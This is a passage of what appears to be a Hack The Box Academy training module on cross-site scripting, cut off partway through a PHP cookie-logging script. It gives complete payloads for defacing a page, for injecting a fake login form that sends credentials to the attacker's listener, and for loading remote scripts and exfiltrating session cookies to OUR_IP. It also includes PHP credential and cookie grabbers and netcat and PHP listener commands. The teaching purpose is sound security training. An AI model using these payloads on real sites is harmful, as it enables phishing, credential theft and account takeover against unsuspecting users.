+<h3 id="changing-page-text">Changing Page Text</h3>
+<p>When we want to change the text displayed on the web page, we can utilize various JavaScript functions for doing so. For example, we can change the text of a specific HTML element/DOM using the <code>innerHTML</code> function:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">document.getElementById(<span class="hljs-string">"todo"</span>)<span class="hljs-selector-class">.innerHTML</span> = <span class="hljs-string">"New Text"</span>
+</code></pre>
+<p>We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the <code>jQuery</code> library must have been imported within the page source):</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-variable">$(</span><span class="hljs-string">"#todo"</span>).html(<span class="hljs-string">'New Text'</span>);
+</code></pre>
+<p>This gives us various options to customize the text on the web page and make minor adjustments to meet our needs. However, as hacking groups usually leave a simple message on the web page and leave nothing else on it, we will change the entire HTML code of the main <code>body</code>, using <code>innerHTML</code>, as follows:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">document.getElementsByTagName(<span class="hljs-string">'body'</span>)[<span class="hljs-number">0</span>]<span class="hljs-selector-class">.innerHTML</span> = <span class="hljs-string">"New Text"</span>
+</code></pre>
+<p>As we can see, we can specify the <code>body</code> element with <code>document.getElementsByTagName('body')</code>, and by specifying <code>[0]</code>, we are selecting the first <code>body</code> element, which should change the entire text of the web page. We may also use <code>jQuery</code> to achieve the same thing. However, before sending our payload and making a permanent change, we should prepare our HTML code separately and then use <code>innerHTML</code> to set our HTML code to the page source.</p>
+<p>For our exercise, we will borrow the HTML code from the main page of <code>Hack The Box Academy</code>:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: white"</span>&gt;</span>Cyber Security Training<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: white"</span>&gt;</span>by 
+        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://academy.hackthebox.com/images/logo-htb.svg"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"25px"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"HTB Academy"</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>
+</code></pre>
+<p>Tip: It would be wise to try running our HTML code locally to see how it looks and to ensure that it runs as expected, before we commit to it in our final payload.</p>
+<p>We will minify the HTML code into a single line and add it to our previous XSS payload. The final payload should be as follows:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">document.getElementsByTagName('body')[0].innerHTML = '<span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: white"</span>&gt;</span>Cyber Security Training<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: white"</span>&gt;</span>by <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://academy.hackthebox.com/images/logo-htb.svg"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"25px"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"HTB Academy"</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>'</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>Once we add our payload to the vulnerable <code>To-Do</code> list, we will see that our HTML code is now permanently part of the web page's source code and shows our message for anyone who visits the page:</p>
+<p><img src="storage\modules\103\xss\_defacing\_change\_text.jpg" alt=""></p>
+<p>By using three XSS payloads, we were able to successfully deface our target web page. If we look at the source code of the web page, we will see the original source code still exists, and our injected payloads appear at the end:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;div&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-unstyled"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"todo"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.body.style.background = <span class="hljs-string">"#141d2b"</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.title = <span class="hljs-string">'HackTheBox Academy'</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">'body'</span>)[<span class="hljs-number">0</span>].innerHTML = <span class="hljs-string">'...SNIP...'</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
+</code></pre>
+<p>This is because our injected JavaScript code changes the look of the page when it gets executed, which in this case, is at the end of the source code. If our injection was in an element in the middle of the source code, then other scripts or elements may get added to after it, so we would have to account for them to get the final look we need.</p>
+<p>However, to ordinary users, the page looks defaced and shows our new look.</p>
+<h2 id="phishing">Phishing</h2>
+<hr>
+<p>Another very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.</p>
+<p>Furthermore, suppose we were to identify an XSS vulnerability in a web application for a particular organization. In that case, we can use such an attack as a phishing simulation exercise, which will also help us evaluate the security awareness of the organization's employees, especially if they trust the vulnerable web application and do not expect it to harm them.</p>
+<hr>
+<h3 id="xss-discovery">XSS Discovery</h3>
+<p>We start by attempting to find the XSS vulnerability in the web application at <code>/phishing</code> from the server at the end of this section. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it'll display it:</p>
+<p><img src="storage\modules\103\xss\_phishing\_image\_viewer.jpg" alt=""></p>
+<p>This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the <code>dead image url</code> icon:</p>
+<p><img src="storage\modules\103\xss\_phishing\_alert.jpg" alt=""></p>
+<p>So, we must run the XSS Discovery process we previously learned to find a working XSS payload. <code>Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page</code>.</p>
+<p>Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.</p>
+<hr>
+<h3 id="login-form-injection">Login Form Injection</h3>
+<p>Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.</p>
+<p>We can easily find an HTML code for a basic login form, or we can write our own login form. The following example should present a login form:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;h3&gt;Please login to <span class="hljs-keyword">continue</span>&lt;/h3&gt;
+&lt;<span class="hljs-keyword">form</span> action=http:<span class="hljs-comment">//OUR_IP&gt;</span>
+    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"username"</span> name=<span class="hljs-string">"username"</span> placeholder=<span class="hljs-string">"Username"</span>&gt;
+    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"password"</span> name=<span class="hljs-string">"password"</span> placeholder=<span class="hljs-string">"Password"</span>&gt;
+    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"submit"</span> name=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"Login"</span>&gt;
+&lt;/<span class="hljs-keyword">form</span>&gt;
+</code></pre>
+<p>In the above HTML code, <code>OUR_IP</code> is the IP of our VM, which we can find with the (<code>ip a</code>) command under <code>tun0</code>. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-symbol">&lt;div&gt;</span>
+<span class="hljs-symbol">&lt;h3&gt;</span>Please login <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span>&lt;/h3&gt;
+&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"text"</span> placeholder=<span class="hljs-string">"Username"</span>&gt;
+&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"text"</span> placeholder=<span class="hljs-string">"Password"</span>&gt;
+&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"Login"</span>&gt;
+<span class="hljs-symbol">&lt;br&gt;</span><span class="hljs-symbol">&lt;br&gt;</span>
+&lt;/div&gt;
+</code></pre>
+<p>Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function <code>document.write()</code>, and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the <code>write</code> function, the final JavaScript code should be as follows:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">document.write('<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Please login to continue<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">http://OUR_IP</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"Username"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"Password"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Login"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>');
+</code></pre>
+<p>We can now inject this JavaScript code using our XSS payload (i.e., instead of running the <code>alert(window.origin)</code> JavaScript Code). In this case, we are exploiting a <code>Reflected XSS</code> vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the <code>Reflected XSS</code> section, and the page should look as follows when we visit the malicious URL:</p>
+<p><img src="storage\modules\103\xss\_phishing\_injected\_login\_form.jpg" alt=""></p>
+<hr>
+<h3 id="cleaning-up">Cleaning Up</h3>
+<p>We can see that the URL field is still displayed, which defeats our line of "<code>Please login to continue</code>". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function <code>document.getElementById().remove()</code> function.</p>
+<p>To find the <code>id</code> of the HTML element we want to remove, we can open the <code>Page Inspector Picker</code> by clicking [<code>CTRL+SHIFT+C</code>] and then clicking on the element we need: <img src="storage\modules\103\xss\_page\_inspector\_picker.jpg" alt="Page Inspector Picker"></p>
+<p>As we see in both the source code and the hover text, the <code>url</code> form has the id <code>urlform</code>:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;form role=<span class="hljs-string">"form"</span> action=<span class="hljs-string">"index.php"</span> method=<span class="hljs-string">"<span class="hljs-keyword">GET</span>"</span> id='urlform'&gt;
+    &lt;input type=<span class="hljs-string">"text"</span> placeholder=<span class="hljs-string">"Image URL"</span> name=<span class="hljs-string">"url"</span>&gt;
+&lt;/form&gt;
+</code></pre>
+<p>So, we can now use this id with the <code>remove()</code> function to remove the URL form:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-selector-tag">document</span><span class="hljs-selector-class">.getElementById</span>(<span class="hljs-string">'urlform'</span>)<span class="hljs-selector-class">.remove</span>();
+</code></pre>
+<p>Now, once we add this code to our previous JavaScript code (after the <code>document.write</code> function), we can use this new JavaScript code in our payload:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">document.write('<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Please login to continue<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">http://OUR_IP</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"Username"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"Password"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Login"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>');document.getElementById('urlform').remove();
+</code></pre>
+<p>When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed:</p>
+<p><img src="storage\modules\103\xss\_phishing\_injected\_login\_form\_2.jpg" alt=""></p>
+<p>We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">...PAYLOAD... &lt;!--
+</code></pre>
+<p>As we can see, this removes the remaining bit of original HTML code, and our payload should be ready. The page now looks like it legitimately requires a login:</p>
+<p><img src="storage\modules\103\xss\_phishing\_injected\_login\_form\_3.jpg" alt=""></p>
+<p>We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form. You can try visiting the URL to ensure that it will display the login form as intended. Also try logging into the above login form and see what happens.</p>
+<hr>
+<h3 id="credential-stealing">Credential Stealing</h3>
+<p>Finally, we come to the part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the error <code>This site can’t be reached</code>. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a <code>site can’t be reached</code> error.</p>
+<p>So, let us start a simple <code>netcat</code> server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:</p>
+<p>Phishing</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nc -lvnp <span class="hljs-number">80</span>
+listening on [any] <span class="hljs-number">80</span> ...
+</code></pre>
+<p>Now, let's attempt to login with the credentials <code>test:test</code>, and check the <code>netcat</code> output we get (<code>don't forget to replace OUR_IP in the XSS payload with your actual IP</code>):</p>
+<p>Phishing</p>
+<pre><code class="lang-shell-session">connect to [<span class="hljs-number">10.10</span>.XX.XX] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.10</span>.XX.XX] XXXXX
+GET /?username=test&amp;password=test&amp;submit=Login HTTP/<span class="hljs-number">1.1</span>
+Host: <span class="hljs-number">10.10</span>.XX.XX
+...SNIP...
+</code></pre>
+<p>As we can see, we can capture the credentials in the HTTP request URL (<code>/?username=test&amp;password=test</code>). If any victim attempts to log in with the form, we will get their credentials.</p>
+<p>However, as we are only listening with a <code>netcat</code> listener, it will not handle the HTTP request correctly, and the victim would get an <code>Unable to connect</code> error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.</p>
+<p>The following PHP script should do what we need, and we will write it to a file on our VM that we'll call <code>index.php</code> and place it in <code>/tmp/tmpserver/</code> (<code>don't forget to replace SERVER_IP with the ip from our exercise</code>):</p>
+<p>Code: php</p>
+<pre><code class="lang-php">&lt;?php
+<span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>]) &amp;&amp; isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'password'</span>])) {
+    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-string">"creds.txt"</span>, <span class="hljs-string">"a+"</span>);
+    fputs(<span class="hljs-variable">$file</span>, <span class="hljs-string">"Username: {$_GET['username']} | Password: {$_GET['password']}\n"</span>);
+    header(<span class="hljs-string">"Location: http://SERVER_IP/phishing/index.php"</span>);
+    fclose(<span class="hljs-variable">$file</span>);
+    <span class="hljs-keyword">exit</span>();
+}
+?&gt;
+</code></pre>
+<p>Now that we have our <code>index.php</code> file ready, we can start a <code>PHP</code> listening server, which we can use instead of the basic <code>netcat</code> listener we used earlier:</p>
+<p>Phishing</p>
+<pre><code class="lang-shell-session"><span class="hljs-symbol">root@</span>htb[/htb]$ mkdir /tmp/tmpserver
+<span class="hljs-symbol">root@</span>htb[/htb]$ cd /tmp/tmpserver
+<span class="hljs-symbol">root@</span>htb[/htb]$ vi index.php #at <span class="hljs-keyword">this</span> step we wrote our index.php file
+<span class="hljs-symbol">root@</span>htb[/htb]$ sudo php -S <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">80</span>
+PHP <span class="hljs-number">7.4</span><span class="hljs-number">.15</span> Development Server (http:<span class="hljs-comment">//0.0.0.0:80) started</span>
+</code></pre>
+<p>Let's try logging into the injected login form and see what we get. We see that we get redirected to the original Image Viewer page:</p>
+<p><img src="storage\modules\103\xss\_image\_viewer.jpg" alt=""></p>
+<p>If we check the <code>creds.txt</code> file in our Pwnbox, we see that we did get the login credentials:</p>
+<p>Phishing</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ cat creds.txt
+<span class="hljs-string">Username:</span> test | <span class="hljs-string">Password:</span> test
+</code></pre>
+<p>With everything ready, we can start our PHP server and send the URL that includes our XSS payload to our victim, and once they log into the form, we will get their credentials and use them to access their accounts.</p>
+<h2 id="session-hijacking">Session Hijacking</h2>
+<hr>
+<p>Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.</p>
+<p>With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a <code>Session Hijacking</code> (aka <code>Cookie Stealing</code>) attack.</p>
+<hr>
+<h3 id="blind-xss-detection">Blind XSS Detection</h3>
+<p>We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. However, in this exercise, we will be dealing with a <code>Blind XSS</code> vulnerability. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.</p>
+<p>Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:</p>
+<ul>
+<li>Contact Forms</li>
+<li>Reviews</li>
+<li>User Details</li>
+<li>Support Tickets</li>
+<li>HTTP User-Agent header</li>
+</ul>
+<p>Let's run the test on the web application on (<code>/hijacking</code>) in the server at the end of this section. We see a User Registration page with multiple fields, so let's try to submit a <code>test</code> user to see how the form handles the data:</p>
+<p><img src="storage\modules\103\xss\_blind\_test\_form.jpg" alt=""></p>
+<p>As we can see, once we submit the form we get the following message:</p>
+<p><img src="storage\modules\103\xss\_blind\_test\_form\_output.jpg" alt=""></p>
+<p>This indicates that we will not see how our input will be handled or how it will look in the browser since it will appear for the Admin only in a certain Admin Panel that we do not have access to. In normal (i.e., non-blind) cases, we can test each field until we get an <code>alert</code> box, like what we've been doing throughout the module. However, as we do not have access over the Admin panel in this case, <code>how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?</code></p>
+<p>To do so, we can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.</p>
+<p>However, this introduces two issues:</p>
+<ol>
+<li><code>How can we know which specific field is vulnerable?</code> Since any of the fields may execute our code, we can't know which of them did.</li>
+<li><code>How can we know what XSS payload to use?</code> Since the page may be vulnerable, but the payload may not work?</li>
+</ol>
+<hr>
+<h3 id="loading-a-remote-script">Loading a Remote Script</h3>
+<p>In HTML, we can write JavaScript code within the <code>&lt;script&gt;</code> tags, but we can also include a remote script by providing its URL, as follows:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://OUR_IP/script.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from <code>script.js</code> to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://OUR_IP/username"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>If we get a request for <code>/username</code>, then we know that the <code>username</code> field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. The following are a few examples we can use from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss">PayloadsAllTheThings</a>:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://OUR_IP</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+'&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://OUR_IP</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://OUR_IP</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>{<span class="hljs-built_in">eval</span>(<span class="hljs-keyword">this</span>.responseText)};a=<span class="hljs-keyword">new</span> XMLHttpRequest();a.addEventListener(<span class="hljs-string">"load"</span>, b);a.open(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"//OUR_IP"</span>);a.send();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="hljs-string">"http://OUR_IP"</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>As we can see, various payloads start with an injection like <code>'&gt;</code>, which may or may not work depending on how our input is handled in the backend. As previously mentioned in the <code>XSS Discovery</code> section, if we had access to the source code (i.e., in a DOM XSS), it would be possible to precisely write the required payload for a successful injection. This is why Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.</p>
+<p>Before we start sending payloads, we need to start a listener on our VM, using <code>netcat</code> or <code>php</code> as shown in a previous section:</p>
+<p>Session Hijacking</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ mkdir /</span>tmp/tmpserver
+root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cd /</span>tmp/tmpserver
+root<span class="hljs-meta">@htb</span>[/htb]$ sudo php -S <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">80</span>
+PHP <span class="hljs-number">7.4</span><span class="hljs-number">.15</span> Development Server (<span class="hljs-string">http:</span><span class="hljs-comment">//0.0.0.0:80) started</span>
+</code></pre>
+<p>Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier, like:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://OUR_IP/fullname</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> #this goes inside the full-name field
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://OUR_IP/username</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> #this goes inside the username field
+...SNIP...
+</code></pre>
+<p>Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.</p>
+<p>Once we submit the form, we wait a few seconds and check our terminal to see if anything called our server. If nothing calls our server, then we can proceed to the next payload, and so on. Once we receive a call to our server, we should note the last XSS payload we used as a working payload and note the input field name that called our server as the vulnerable input field.</p>
+<p><code>Try testing various remote script XSS payloads with the remaining input fields, and see which of them sends an HTTP request to find a working payload</code>.</p>
+<hr>
+<h3 id="session-hijacking">Session Hijacking</h3>
+<p>Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.</p>
+<p>A session hijacking attack is very similar to the phishing attack we performed in the previous section. It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.</p>
+<p>There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc">PayloadsAllTheThings</a>:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">'http://OUR_IP/index.php?c='</span>+<span class="hljs-built_in">document</span>.cookie;
+<span class="hljs-keyword">new</span> Image().src=<span class="hljs-string">'http://OUR_IP/index.php?c='</span>+<span class="hljs-built_in">document</span>.cookie;
+</code></pre>
+<p>Using any of the two payloads should work in sending us a cookie, but we'll use the second one, as it simply adds an image to the page, which may not be very malicious looking, while the first navigates to our cookie grabber PHP page, which may look suspicious.</p>
+<p>We can write any of these JavaScript payloads to <code>script.js</code>, which will be hosted on our VM as well:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">new</span> Image().src=<span class="hljs-string">'http://OUR_IP/index.php?c='</span>+<span class="hljs-built_in">document</span>.cookie
+</code></pre>
+<p>Now, we can change the URL in the XSS payload we found earlier to use <code>script.js</code> (<code>don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload</code>):</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://OUR_IP/script.js</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.</p>
+<p>We can save the following PHP script as <code>index.php</code>, and re-run the PHP server again:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'c'</span>])) {
+    $list = explode(<span class="hljs-string">";"</span>, $_GET[<span class="hljs-string">'c'</span>]);
